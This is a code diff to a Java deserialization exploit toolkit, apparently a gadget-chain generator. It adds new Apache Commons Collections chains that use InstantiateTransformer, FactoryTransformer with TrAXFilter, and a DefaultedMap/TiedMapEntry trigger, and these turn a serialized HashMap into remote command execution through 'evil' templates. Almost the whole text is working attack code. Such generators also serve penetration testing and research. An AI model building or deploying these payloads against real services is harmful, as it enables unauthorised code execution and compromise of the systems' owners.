@@ -7,6 +7,7 @@ import javassist.CtClass;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.*;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.DefaultedMap;
 import org.apache.commons.collections.map.LazyMap;
 import xyz.eki.marshalexp.sink.jdk.GTemplates;
 import xyz.eki.marshalexp.utils.MiscUtils;
@@ -31,7 +32,12 @@ public class GCC {
         return transformerChain;
     }
 
-
+    public static Transformer instantiateTransformer2RCEWithoutChainedTransformer(String cmd) throws Exception {
+        final Transformer transformer = new InstantiateTransformer(
+                        new Class[] { Templates.class },
+                        new Object[] {GTemplates.getEvilTemplates(cmd)} );
+        return transformer;
+    }
 
     public static Transformer instantiateTransformer2RCE(String cmd) throws Exception {
         final Transformer[] transformers = new Transformer[] {
@@ -63,7 +69,14 @@ public class GCC {
                 TrAXFilter.class,
                 new Class[] { Templates.class },
                 new Object[] {GTemplates.getEvilTemplates(bytes)} ));
+        return transformer;
+    }
 
+    public static Transformer instantiateFactory2RCE(String cmd) throws Exception {
+        Transformer transformer = new FactoryTransformer(new InstantiateFactory(
+                TrAXFilter.class,
+                new Class[] { Templates.class },
+                new Object[] {GTemplates.getEvilTemplates(cmd)} ));
         return transformer;
     }
 
@@ -90,10 +103,38 @@ public class GCC {
         TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "whatever");
 
         HashMap<Object, Object> source = new HashMap<>();
-        source.put(tiedMapEntry, "Eki");
+        source.put(tiedMapEntry, "dummykitty");
         lazyMap.remove("whatever");
 
         ReflectUtils.setFieldValue(lazyMap,"factory", transformer);
+
+        return source;
+    }
+
+    public static HashMap getValue2TransformerInvoke_DefaultedMap(Transformer transformer) throws Exception {
+        HashMap<Object, Object> map = new HashMap<>();
+        Map<Object,Object> defaultedMap = DefaultedMap.decorate(map, new ConstantTransformer(1));
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(defaultedMap, "whatever");
+
+        HashMap<Object, Object> source = new HashMap<>();
+        source.put(tiedMapEntry, "dummykitty");
+        defaultedMap.remove("whatever");
+
+        ReflectUtils.setFieldValue(defaultedMap,"value", transformer);
+
+        return source;
+    }
+
+    public static HashMap getValue2TransformerInvoke_DefaultedMap(Transformer transformer,Object key) throws Exception {
+        HashMap<Object, Object> map = new HashMap<>();
+        Map<Object,Object> defaultedMap = DefaultedMap.decorate(map, new ConstantTransformer(1));
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(defaultedMap, key);
+
+        HashMap<Object, Object> source = new HashMap<>();
+        source.put(tiedMapEntry, "dummykitty");
+        defaultedMap.remove("whatever");
+
+        ReflectUtils.setFieldValue(defaultedMap,"value", transformer);
 
         return source;
     }
